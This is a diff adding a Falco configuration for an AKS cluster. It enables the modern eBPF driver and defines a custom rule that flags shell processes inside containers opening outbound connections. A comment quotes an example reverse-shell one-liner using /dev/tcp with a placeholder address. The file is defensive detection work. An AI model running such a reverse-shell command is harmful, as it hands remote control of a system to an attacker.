@@ -1,0 +1,28 @@
+# Modern eBPF probe is shipped inside the Falco binary and works on the
+# AKS default node image (Ubuntu, kernel 5.8+). No kernel module build needed.
+driver:
+  kind: modern_ebpf
+
+# Custom rule for attack #6: a shell process inside a container opening an
+# outbound network connection is the classic reverse-shell technique
+# (e.g. `bash -i >& /dev/tcp/<ip>/<port> 0>&1`). Reuses the default
+# `container` macro and `shell_binaries` list shipped with the Falco rules.
+customRules:
+  reverse-shell.yaml: |-
+    - rule: Reverse Shell In Container
+      desc: >
+        A shell process running inside a container initiated an outbound
+        network connection, a common reverse-shell technique used after
+        a container compromise.
+      condition: >
+        evt.type = connect and evt.dir = <
+        and container
+        and fd.typechar = 4
+        and proc.name in (shell_binaries)
+      output: >
+        Reverse shell detected in container
+        (user=%user.name container=%container.name image=%container.image.repository
+        shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline
+        connection=%fd.name)
+      priority: CRITICAL
+      tags: [container, network, mitre_execution, T1059]
